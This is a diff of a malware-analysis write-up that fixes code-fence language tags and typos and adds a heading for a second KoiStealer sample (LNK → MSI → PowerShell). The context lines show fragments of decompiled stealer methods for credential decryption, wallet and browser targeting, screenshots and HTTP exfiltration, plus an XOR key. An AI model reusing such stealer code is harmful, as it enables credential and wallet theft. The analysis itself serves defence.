@@ -271,7 +271,7 @@ We now have the XOR key `LenKQVy4Bh10vp2vt9AE` and can decrypt the assmebly.
 
 We can see that the other 2 arguments are passed to the main function:
 
-```chsarp
+```csharp
 private static void Main(string[] args)
 {
 	if (args.Length < 2)
@@ -315,7 +315,7 @@ private static bool smethod_13<T>(string sourceFile, T metadata)
 
 Extracts encrypted credentials from files:
 
-```chsarp
+```csharp
 private static byte[] smethod_18(string path)
 {
     byte[] decryptedData = new byte[0];
@@ -345,7 +345,7 @@ private static byte[] smethod_18(string path)
 
 Targets sensitive data from widely used software, including crypto wallets and browsers.
 
-```chsarp
+```csharp
 private static int smethod_36(string userFolder)
 {
     string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
@@ -365,7 +365,7 @@ private static int smethod_36(string userFolder)
 
 Captures screenshots of the victim's screen.
 
-```chsarp
+```csharp
 private static void smethod_37()
 {
     MemoryStream screenshotStream = new MemoryStream();
@@ -389,7 +389,7 @@ private static void smethod_37()
 
 Exfiltrates the stolen data over HTTP(S).
 
-```chsarp
+```csharp
 private static string smethod_49(string url, byte[] identifier, byte[] xorKey)
 {
     try
@@ -433,7 +433,11 @@ private static string smethod_49(string url, byte[] identifier, byte[] xorKey)
 
 That wraps up the first sample.
 
-This second sample is executed as an assmelby in memory and stems from an LNK file:
+---
+
+## Sample 2: LNK → MSI → PowerShell → KoiStealer
+
+This second sample is executed as an assembly in memory and stems from an LNK file:
 
 ## Initial LNK File
 
